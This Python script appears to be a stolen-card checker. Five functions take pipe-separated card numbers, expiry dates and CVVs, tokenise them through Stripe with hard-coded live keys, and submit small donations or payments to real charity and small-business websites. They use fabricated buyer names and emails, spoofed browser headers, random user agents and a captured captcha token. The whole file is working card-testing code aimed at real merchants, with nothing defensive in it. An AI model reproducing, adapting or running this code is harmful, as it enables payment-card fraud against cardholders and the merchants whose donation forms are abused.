import requests,re
from user_agent import generate_user_agent
from faker import Faker
import uuid
import random

# Initialize Faker
fake = Faker()
def Tele(ccx):
        import requests
        ccx=ccx.strip()
        cc = ccx.split("|")[0]
        mes = ccx.split("|")[1]
        ano = ccx.split("|")[2]
        cvv = ccx.split("|")[3]
        if "20" in ano:#Mo3gza
            ano = ano.split("20")[1]
        r = requests.session()
        
        # Generate fake data
        firstname = fake.first_name()
        lastname = fake.last_name()
        username = fake.user_name()
        domain = fake.random_element(elements=('gmail.com', 'outlook.com', 'hotmail.com'))
        mail = fake.email(domain=domain)
        guid = str(uuid.uuid4())    
        muid = str(uuid.uuid1())    
        sid = str(uuid.uuid5(uuid.NAMESPACE_DNS, 'example.com'))    
        time_on_page = random.randint(1, 30000) 
    
        headers = {
    'authority': 'api.faithfi.com',
    'accept': 'application/json',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://www.faithfi.com',
    'referer': 'https://www.faithfi.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

        json_data = {
    'amount': '100',
    'receipt_email': mail,
    'description': '',
    'statement_descriptor': '',
    'statement_descriptor_suffix': '',
    'metadata': {
        'customer': {
            'first_name': firstname,
            'last_name': lastname,
            'email': mail,
        },
        'address': {
            'first_name': firstname,
            'last_name': lastname,
            'address': '1489 W Warm Springs Rd #110',
            'address2': None,
            'city': 'Henderson',
            'state': 'NC',
            'zip_code': '89014',
        },
        'transaction': {
            'processing_fee': 0,
            'utm_source': 'other',
            'commerce_campaign': 2,
            'payment_method': 'Web',
            'tax_exempt': 'True',
            'receipt_method': 'email',
        },
        'pledge': {
            'amount': '100',
            'date': '2024-10-22',
        },
    },
}

        response = requests.post('https://api.faithfi.com/commerce/create-payment-intent', headers=headers, json=json_data)
        data = response.json()
        client_secret = data['client_secret']
        pi = client_secret
        pi2 = client_secret.split('_secret_')[0]


        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

        data = f'return_url=https%3A%2F%2Fwww.faithfi.com%2Fgive&shipping[name]=Khant+Ti+Kyi&shipping[address][line1]=1489+W+Warm+Springs+Rd+%23110&shipping[address][city]=Henderson&shipping[address][country]=US&shipping[address][postal_code]=89014&shipping[address][state]=NC&shipping[phone]=&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={ano}&payment_method_data[card][exp_month]={mes}&payment_method_data[allow_redisplay]=unspecified&payment_method_data[billing_details][name]=Khant+Ti+Kyi&payment_method_data[billing_details][address][line1]=1489+W+Warm+Springs+Rd+%23110&payment_method_data[billing_details][address][city]=Henderson&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][postal_code]=89014&payment_method_data[billing_details][address][state]=NC&payment_method_data[billing_details][phone]=&payment_method_data[billing_details][email]={mail}&payment_method_data[payment_user_agent]=stripe.js%2F9bc7c050af%3B+stripe-js-v3%2F9bc7c050af%3B+payment-element%3B+deferred-intent%3B+autopm&payment_method_data[referrer]=https%3A%2F%2Fwww.faithfi.com&payment_method_data[time_on_page]=41037&payment_method_data[client_attribution_metadata][client_session_id]=69554d8a-9999-43ce-81c5-afd1e05ee431&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=payment-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2021&payment_method_data[client_attribution_metadata][payment_intent_creation_flow]=deferred&payment_method_data[client_attribution_metadata][payment_method_selection_flow]=automatic&payment_method_data[guid]={guid}&payment_method_data[muid]={muid}&payment_method_data[sid]={sid}&expected_payment_method_type=card&client_context[currency]=usd&client_context[mode]=payment&client_context[setup_future_usage]=off_session&use_stripe_sdk=true&key=pk_live_51HFP4EHO3CXDdJZC3eD1OI4VHJit8D9jFNG5AydVbh5R1jIXthAiVAzZkFqSikf58mB8bX5iMOSlxdpps6i26lWu00kfoE18OL&client_secret={pi}'

        r2 = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{pi2}/confirm',
    headers=headers,
    data=data,
)
        return (r2.json())
        
        
        
# Initialize Faker
fake = Faker()
def Tele1(ccx):
        import requests
        ccx=ccx.strip()
        cc = ccx.split("|")[0]
        mes = ccx.split("|")[1]
        ano = ccx.split("|")[2]
        cvv = ccx.split("|")[3]
        if "20" in ano:#Mo3gza
            ano = ano.split("20")[1]
        r = requests.session()
        
        # Generate fake data
        firstname = fake.first_name()
        lastname = fake.last_name()
        username = fake.user_name()
        domain = fake.random_element(elements=('gmail.com', 'outlook.com', 'hotmail.com'))
        mail = fake.email(domain=domain)
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': generate_user_agent(),
        }
        
        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=2d040096-2b13-43ea-a47b-f7f1d9e50fe3f6509d&muid=1d94c087-083e-4eea-8adc-133374f3b3c1056df3&sid=1fe07e1f-c70a-4334-ab72-ee1a1eecb07099a9d6&payment_user_agent=stripe.js%2Fc710570bc1%3B+stripe-js-v3%2Fc710570bc1%3B+card-element&referrer=https%3A%2F%2Fwww.ninodelacaridad.com&time_on_page=68022&key=pk_live_51OHFDAD6V9VrPDWYITrtYPuIZidiK5rIQtbdfE98OcfqO4DM5MMan5NbBuSgoplkUGCgIcSoveUYuNwoe3M7cLqy00iKYJSaeB&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiRElKU0tjZzdSSW05Y1IweGxIUGhod3UxWWpMeHQ2dFl2bTBUUnlsb3VsU2FRcytQWXhBamRaRjFGbEhDWVYwbFRaR2p0emJPRUVPWjZuWmlWcjc4MXZkUEkxOXc1QkNSeDk1R0lBYXZmNEZhRG9xZSt3UExnQm9acTIyeGN6Y1V0aUN4QUhzTkQvNFhKS1RYNngvSkJqY2wzSE5TQVNnYjRtOC8xUnlQcEZSNjBjT3JlNDBxUUllcjdnWEtjMEwybjV6ajNJcUxKSW1NL0U2RG5KbXljaklLbWgvM1ZXZVdNMHMrV3paWkdkMFJkMGd2SE9heElDUlJtcDFkWVlrWnFHdmlTZXlKOHlIcDlNM0V2SkVvZ2NZakdJYUQ3TExoTlFwRUg2YmVWbk1NamFDU2FJK0kxNkJPU1BkR0QyQ0hvUmxoZEk5RUZvY2o0N28zSlRDSXczQkw0YlFQeFBkVUgxOVAydzFjWWNDK21GOVA1YTRBdkdEOVI3b21jMHp5U0YwMFdkNmNEaWF0ajR5ekowNExuL3FVWCtKcXg4U0E0dm5KWUtQRStoNnllU2V1bld2djNvbHY3Z2NGY0M1SlZic3M2L0pUUDZ3akFiZEpFWVprMzRMQk1pcVVRTmcycWdaL0NpZjRySklmMFFjZDFLYm14NytLTWdhNEpmQ2xlTTVmZHYvSE5scFB6TWh3S0U2VitnYmQ4czQ0d3VURWZELy84clJ2SGxPK3lIS3pxQnpJdkhkaWxPdFlHWWsyc1FsYkFWZ3JrK1l4dzN1VGhVSXB1VG5iT21veHB3WDR3R1pvbVB4Z3lYVkdFb3NKem4zSS9QQmNwU3hpMTNNVUFlekJ4UzhiR0dKQlhTaUNkMjlOTVIyRmZtWU9tRWxHUmtWT2w1aGVJVmVmekh1MFlzaWRvZVF6a21nRklzcm5xYzBqOGk0eVZUbjkwRUZtcTNUNklyeWlBRyt0eEVoT0dRSWl6VUtsT2ZnbkxsaVZmcHl3S2VRUnlUc3FSdnZaMk1kQnBzZ2luTlg4ZHgyVFgvSDJWT1FLdzJaMDJHdXJNbHBPdVhIWlVwTWxFYTZ3RnNVTDBOOERDNUJtY1FtWTNNRXRIdG1RRklnOE40bEE1WDNGamxLSXNVMTVweFFwS1BhcWhtWGhaZjgxeFp6dFMrSUR5ZnBIdVQ1YXVYV2QrdXgzNHNUMTRBQmdIRlFxeXcveU5PR3NYaGg0dXh2cHowVER3SU1VQjgzZXQzNWhQOHhndWltai8xWEdHTFp6UEJDR0MzVjFIVWdCRDUzWTBxUHplcjhQREpqV0REaTA1WkxNeElSbnAxR1c5OXkwQ2puY2dDck9WV0lBTkJzK0hSWFZOcGExdkhDc3FPeDJHZExValFsRExKTVk0ZTdVYXZLVDVDMzNlcCtWMnlWTUdCVVdwT1ErVVpTbUFZOUdoRnRBbWpqR0FaR09TT0t3WHIrK3VKeTBPNlJhUnRPTkRPNkZadUlvK1dCcGY5SGJoMFZueUVrcmd2YlVrQVZYUzBKbHJKcHNjNDcxbmhieGlOUU5Ca2xYZzFNYmNRc0VRcnFxNTdTK29MZ0NmWXFpZ2MrWk96cTBvMTFqcU9kL2lIS2dISWpESTlVV3NqbWF5VFlKQkxSUTFsZkVuTlJjaXl3YlFBUUlGQVIvMFU5UmtwMldjVUxLQ2tYMUpUR0Z3V3VoOHhJMktiNGF0S2VHUGhjQlRxU2FJYXZTeTRDd1VZYzhtdDNXSy9TY1d3TmdwREFFR2xlcytCL1o0eXQ2bHNCdHhtMDdsQmdneGozc2NDank3azYrdDI5eHJLNVNLOTZLNkF5VlRaWERNWmpZSEV1Tjg3d2FtM0xINVUzYlNFaE9lbGZPTFR2MmF3M0dHZnRRUFVkUWIyeXBKVE43ZDhDTHlZT0Zua0xESDFuaWhCT0RrWEVqTkpuZVIzZ2doMUs5cnVVV2VScGI1a2NDUVlEY1pvMk5jY3pIMkIzeE9mT3EwdlpPTzhqRU1CYkdYWFh1eE5mbG9rVWJRQUR0MjBVTk1aR0hKeFk0WXlqMG1UK2ZFZlphQmpBd25UclJXbS95VUZyckFkOW0wMFZxVzU5NFI0elFINWFsNFZDQnlJdDNOUHg3NG1jSFYzUmpYcWZIcklRWHlHUE95bmNGek5pZmdUbU1saTZxNUF3SzVCOHROeXlzRW9oSjNKQldPSFBnOHM3RVprRDNQYzI4eVNPOWxOb1VrenVWZlR6dmcwckx3NG0vS0dmUGlndmxsQW1QNTh1Z2plNElMRk5La3creDNtdm5BY2REY1RMSXhrU090Wkp6dmFDSjB6NXpIMlJHcDNraTNMM3BBL05jVHdBUitoMmwxeEhGOGZTSnd2T25Oc1gweDVLdkltYm1RWHhzcUJBV3BhZXRKKytoelBOOHlXRFhyTkZ5ZjkzbDlYMjFheXZhaUlRU1JNZmRQd3FQOGhaa1hReTFjN1AwdllmcXcxdDIvVnFNY1VKdFVWVlJQeDdRTktVREVXSHBkYTF3L0F1eDhFVnluQndaTHMvQzA1MXp6MU5VaGx2K3hjOEdxRUc3R0ZPQlczbUlIbmtDeURmU25GdlhoNllhVjRpYWZ3dE5tZkZzWkMyUU5admFiQkhHUVlsQlI5dnZiNkhGWFhjSWpFTUZaUzVJZEROaVhqQk9odGJNMkd2TVpjU0V0NTBkbEFsNHVDYWVDcUU0RWdiRVZUOElYazloMzh4ODcwTWE0M21OUTlDOCtLemcvQUhOcERPQmtiWHlxNFM1SklGVjI2NmhiUHBnS0oxNTZaNmFneEdVNnNrYjdJRlBTY2hVcko2OGNUbjhndVJhSVcwdGZTcXdSbzhLUjFCM0V1R3dGVTdVOE5RT01zN3k3bmE3Rmc9PSIsImV4cCI6MTcyNTYzMzMxMiwic2hhcmRfaWQiOjM2MjQwNjk5Niwia3IiOiIxMDNlOWQwNSIsInBkIjowLCJjZGF0YSI6IjBQR0wzaDFQT3IyZ0RjNVdTeC9XVFNpRWNSTUxQNDhaNnRLTkVvaWZ2MmdHTlRFR3dkZGFqNFpaL2E0TXp0a1kxN0xmdUtpcy9uWmxxbWhuYmZVNGQ2UlVuOXo1S01obDl6OEt6d2Z3UFlRT09YeGpYYjZSY2VCOHVZTDlZZFBPR3lzQWZDQkhtTlRoQTRYcVR2ODl0bkQ1OFRmZ3RTTXh4NTNUc0VMOWs3RU5lWFMza2o4TTJyOUV0Z29PeGJvRUlmUFA4SXBGSW1veDhaWkgifQ.-oTYVedfSsxUsOGm7U2-mt7hK-COJIu1ofpILs-SfEY'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:     
            id = response.json()['id']
        except:
            pass
        
        
        
        headers = {
            'authority': 'www.ninodelacaridad.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.ninodelacaridad.com',
            'referer': 'https://www.ninodelacaridad.com/events-for-2024/latinos-destinados-a-triunfar/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': generate_user_agent(),
            'x-requested-with': 'XMLHttpRequest',
        }
        
        params = {
            't': '1725633251190',
        }
        
        data = {
            'data': f'__fluent_form_embded_post_id=2612&_fluentform_20_fluentformnonce=34e6ab4c24&_wp_http_referer=%2Fevents-for-2024%2Flatinos-destinados-a-triunfar%2F&names%5Bfirst_name%5D=thu&names%5Blast_name%5D=ra&phone=%2B18172388000&email={mail}&payment_input=Credit%20card&payment_input_1=Custom%20Amount&custom-payment-amount_1=10&payment_method=stripe&__stripe_payment_method_id={id}',
            'action': 'fluentform_submit',
            'form_id': '20',
        }
        
        r3 = requests.post(
            'https://www.ninodelacaridad.com/wp-admin/admin-ajax.php',
            params=params,
            headers=headers,
            data=data
        )
        return (r3.json())
        
# Initialize Faker
fake = Faker()
def Tele2(ccx):
        import requests
        ccx=ccx.strip()
        cc = ccx.split("|")[0]
        mes = ccx.split("|")[1]
        ano = ccx.split("|")[2]
        cvv = ccx.split("|")[3]
        if "20" in ano:#Mo3gza
            ano = ano.split("20")[1]
        r = requests.session()
        
        # Generate fake data
        firstname = fake.first_name()
        lastname = fake.last_name()
        username = fake.user_name()
        domain = fake.random_element(elements=('gmail.com', 'outlook.com', 'hotmail.com'))
        mail = fake.email(domain=domain)
        
        headers = {
		    'authority': 'api.stripe.com',
		    'accept': 'application/json',
		    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
		    'content-type': 'application/x-www-form-urlencoded',
		    'origin': 'https://js.stripe.com',
		    'referer': 'https://js.stripe.com/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': generate_user_agent(),
		}
		
        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=2d040096-2b13-43ea-a47b-f7f1d9e50fe3f6509d&muid=caa063ab-9036-4530-aa5b-0b998ec431ed77a963&sid=8cb685fd-73be-4faf-8e1b-4bcd67e51f60f521b0&pasted_fields=number&payment_user_agent=stripe.js%2F064d3d4e55%3B+stripe-js-v3%2F064d3d4e55%3B+card-element&referrer=https%3A%2F%2Fjulievoris.com&time_on_page=34380&key=pk_live_51He5MlCVRYvpd05zW0zTzeXiymqQaUy2IJC0m0nUF8ViljOtPYT6rQdDwUYQMcaiGDZtzHOAO47GjNXArU8AABuK00g1aWti4o'
		
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
		
        try:     
            id = response.json()['id']
        except:
            pass
		
        headers = {
		    'authority': 'julievoris.com',
		    'accept': '*/*',
		    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
		    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
		    'origin': 'https://julievoris.com',
		    'referer': 'https://julievoris.com/project100-mindset-magic-group/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': generate_user_agent(),
		    'x-requested-with': 'XMLHttpRequest',
		}
		
        params = {
		    't': '1728312241410',
		}
		
        data = {
		    'data': f'__fluent_form_embded_post_id=15208&_fluentform_35_fluentformnonce=be3e71c2d6&_wp_http_referer=%2Fproject100-mindset-magic-group%2F&names%5Bfirst_name%5D=Mr%20Angus%20Thiel&names%5Blast_name%5D=Ea&email={mail}&input_text=%40ufuhdh&payment_input=19.97&payment_method=stripe&__entry_intermediate_hash=33e108508efe9255c266c4b1770efd71&__stripe_payment_method_id={id}',
		    'action': 'fluentform_submit',
		    'form_id': '35',
		}
		
        r4 = requests.post(
		    'https://julievoris.com/wp-admin/admin-ajax.php',
		    params=params,
		    headers=headers,
		    data=data,
		)
        return (r4.json())
        
# Initialize Faker
fake = Faker()
def Tele3(ccx):
        import requests
        ccx=ccx.strip()
        cc = ccx.split("|")[0]
        mes = ccx.split("|")[1]
        ano = ccx.split("|")[2]
        cvv = ccx.split("|")[3]
        if "20" in ano:#Mo3gza
            ano = ano.split("20")[1]
        r = requests.session()
        
        # Generate fake data
        firstname = fake.first_name()
        lastname = fake.last_name()
        username = fake.user_name()
        domain = fake.random_element(elements=('gmail.com', 'outlook.com', 'hotmail.com'))
        mail = fake.email(domain=domain)
        
        
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': generate_user_agent(),
}

# Format the data payload for token generation
        data = f'time_on_page=140659&pasted_fields=number&guid=NA&muid=NA&sid=NA&key=pk_live_yZsZ8CnKR62sWJPaT97tC5Bp&payment_user_agent=stripe.js%2F78ef418&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}'

# Make request to Stripe API to get the token
        response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)

# Check for successful token generation
        try:
            response_json = response.json()
            if 'id' in response_json:
                tok = response_json['id']
                print(f"Token generated: {tok}")
            else:
                print(f"Error: {response_json.get('error', 'Unknown error occurred')}")
                tok = None
        except ValueError:
            print(f"Error: Failed to parse response from Stripe API: {response.text}")
            tok = None

# Proceed if token is retrieved
        if tok:
            headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Authorization': 'Basic MDFHWllCNDQ4RU4xQlc2NlhSTkRFUU5DTjg6',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://merlin.simpledonation.com',
        'Referer': 'https://merlin.simpledonation.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': generate_user_agent(),
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    # Donation details
            json_data = {
        'widget_id': '01GZYB448EN1BW66XRNDEQNCN8',
        'key': '01GZYB448EN1BW66XRNDEQNCN8',
        'schedule': 'ONETIME',
        'amount': 654,
        'is_fee_covered': True,
        'session_id': 'bddcdf3b-73a7-44a4-8216-03cf847fb696',
        'fund_id': 1634,
        'memo': None,
        'browser_date': '10/9/2024',
        'payment_source_id': tok,
        'saved_payment_id': None,
        'gateway_payment_details': {
            'stripe_token': tok,
        },
        'gateway': 'stripe',
        'payment_type': 'CREDIT_CARD',
        'merlin_version': '5.6.9',
        'transaction_type': 'donation',
        'host_url': 'kolbecentermacon.org/get-involved/',
        'giving_flow': 'standard',
        'marketing_code': None,
        'address': None,
        'utm_params': {},
        'rock_entity_id': None,
        'rock_entity_type_id': None,
        'rock_financial_account_id': None,
        'stripe_intent_id': None,
        'person': {
            'id': None,
            'first_name': 'Khant Ti',
            'last_name': 'Kyi',
            'email': mail,
            'twilio_number': None,
        },
    }

    # Make the donation request
        r5 = requests.post('https://thekolbecenter.simpledonation.com/merlin/charges', headers=headers, json=json_data)
        
        return (r5.json())
        
# Initialize Faker
fake = Faker()
def Tele5(ccx):
        import requests
        ccx=ccx.strip()
        cc = ccx.split("|")[0]
        mes = ccx.split("|")[1]
        ano = ccx.split("|")[2]
        cvv = ccx.split("|")[3]
        if "20" in ano:#Mo3gza
            ano = ano.split("20")[1]
        r = requests.session()
        
        # Generate fake data
        firstname = fake.first_name()
        lastname = fake.last_name()
        username = fake.user_name()
        domain = fake.random_element(elements=('gmail.com', 'outlook.com', 'hotmail.com'))
        mail = fake.email(domain=domain)
        guid = str(uuid.uuid4())    
        muid = str(uuid.uuid1())    
        sid = str(uuid.uuid5(uuid.NAMESPACE_DNS, 'example.com'))    
        time_on_page = random.randint(1, 30000) 
        

        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': generate_user_agent(),
}

        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid={guid}&muid={muid}sid={sid}&pasted_fields=number&payment_user_agent=stripe.js%2Fee4145ae1a%3B+stripe-js-v3%2Fee4145ae1a%3B+card-element&referrer=https%3A%2F%2Fcgnrentals.com&time_on_page={time_on_page}&key=pk_live_51MHxOaCGSG6F5CDpOv0O1mnr1gfWRhwIg9nQnX8qT6oJneH4lt50ErVpMlnhJ6HY6m1tHMRrhGyBwNQG72c0XUjP00asdG3DKI'

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:     
            id = response.json()['id']
        except:
            pass


        cookies = {
    'PHPSESSID': '28550b1eab43933d553c044f3eaeab98',
    '_ga': 'GA1.1.1849041944.1729420977',
    '_fbp': 'fb.1.1729420977595.186803745800016012',
    '__stripe_mid': 'bdd9b610-080a-48da-8771-c2be2e55040d32a4df',
    '__stripe_sid': '63d90791-5006-4a7a-9711-767496e899d25c212b',
    '_ga_VCPW9JLZ3V': 'GS1.1.1729420977.1.1.1729421048.0.0.0',
    '_gcl_au': '1.1.444346116.1729420976.350273367.1729421041.1729421049',
}

        headers = {
    'authority': 'cgnrentals.com',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=28550b1eab43933d553c044f3eaeab98; _ga=GA1.1.1849041944.1729420977; _fbp=fb.1.1729420977595.186803745800016012; __stripe_mid=bdd9b610-080a-48da-8771-c2be2e55040d32a4df; __stripe_sid=63d90791-5006-4a7a-9711-767496e899d25c212b; _ga_VCPW9JLZ3V=GS1.1.1729420977.1.1.1729421048.0.0.0; _gcl_au=1.1.444346116.1729420976.350273367.1729421041.1729421049',
    'origin': 'https://cgnrentals.com',
    'referer': 'https://cgnrentals.com/payments/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': generate_user_agent(),
    'x-requested-with': 'XMLHttpRequest',
}

        params = {
    't': '1729421049789',
}

        data = {
    'data': f'__fluent_form_embded_post_id=272&_fluentform_3_fluentformnonce=73d21d956f&_wp_http_referer=%2Fpayments%2F&custom-payment-amount=0.50&payment_method=stripe&names%5Bfirst_name%5D=thu&names%5Bmiddle_name%5D=&names%5Blast_name%5D=ra&email={mail}&phone=%2B18172388000&dropdown=Vehicles&__stripe_payment_method_id={id}',
    'action': 'fluentform_submit',
    'form_id': '3',
}

        r6 = requests.post(
    'https://cgnrentals.com/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data
)
        return (r6.json())